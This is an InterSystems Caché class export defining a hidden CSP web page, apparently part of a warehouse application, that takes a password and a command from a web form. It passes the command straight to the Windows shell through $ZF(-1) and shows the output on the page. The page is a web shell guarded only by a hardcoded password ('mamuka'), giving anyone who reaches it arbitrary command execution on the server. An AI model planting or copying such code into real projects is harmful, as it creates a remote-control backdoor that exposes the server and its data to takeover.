<?xml version="1.0" encoding="UTF-8"?>
<Export generator="Cache" version="20">
<Class name="csp.playcommand">
<ClassType/>
<Hidden>1</Hidden>
<Import>User</Import>
<Language>cache</Language>
<ProcedureBlock>0</ProcedureBlock>
<Super>%CSP.Page</Super>
<TimeCreated>61908,48068.763783</TimeCreated>

<Method name="OnPage">
<ClassMethod>1</ClassMethod>
<CodeMode>code</CodeMode>
<ReturnType>%Status</ReturnType>
<Implementation><![CDATA[
	Do ..OnPageCSPROOT()
	Quit $$$OK
]]></Implementation>
</Method>

<Method name="OnPageBODY">
<ClassMethod>1</ClassMethod>
<CodeMode>code</CodeMode>
<ReturnType>%Boolean</ReturnType>
<Implementation><![CDATA[
	Write "<body>"
	Write !,"<form>"
	Write !,..InsertHiddenFields(""),!
	Write !,($G(string))_"<br>",!
	Write "Пароль "
	Write "<input type=""text"" name=""password"">"
	Write "<br>",!
	Write "Команда "
	Write "<input type=""text"" name=""command"" size=120>"
	Write "<br>",!
	Write "<input type=""submit"" value=""ok"">"
	Write !,"</form>"
	Write !,"</body>"
]]></Implementation>
</Method>

<Method name="OnPageCSPROOT">
<ClassMethod>1</ClassMethod>
<CodeMode>code</CodeMode>
<ReturnType>%Boolean</ReturnType>
<Implementation><![CDATA[
	s password=%request.Get("password")
	s command=%request.Get("command")
	if password="mamuka" do
	. d $ZF(-1,command_" > c:\cachesys\csp\sklad2\lastresult.txt")
	. s string="Выполнили команду "_command_" <br>"
	. s file=##class(%File).%New("c:\cachesys\csp\sklad2\lastresult.txt")
	. d file.Open("S")
	. f  s str=file.Read(2000) q:str=""  d
	. . s string=string_$zcvt(str,"I","CP866")_"<br>"
	else  s string="Неверный пароль"
	Write !
	Do ..OnPageHTML()
]]></Implementation>
</Method>

<Method name="OnPageHEAD">
<ClassMethod>1</ClassMethod>
<CodeMode>code</CodeMode>
<ReturnType>%Boolean</ReturnType>
<Implementation><![CDATA[
	Write "<head>"
	Write !,"<title>	Выполнение команд командного процессора windows </title>",!
	Write !,"</head>"
]]></Implementation>
</Method>

<Method name="OnPageHTML">
<ClassMethod>1</ClassMethod>
<CodeMode>code</CodeMode>
<ReturnType>%Boolean</ReturnType>
<Implementation><![CDATA[
	Write "<html>"
	Write !
	Do ..OnPageHEAD()
	Write !,!
	Do ..OnPageBODY()
	Write !,"</html>"
]]></Implementation>
</Method>

<Parameter name="CSPFILE">
<Default>c:\cachesys\csp\sklad2\playcommand.csp</Default>
</Parameter>

<Parameter name="CSPURL">
<Default>/csp/sklad2/playcommand.csp</Default>
</Parameter>

<Parameter name="FileTimestamp">
<Default>61205,41473</Default>
</Parameter>
</Class>
</Export>
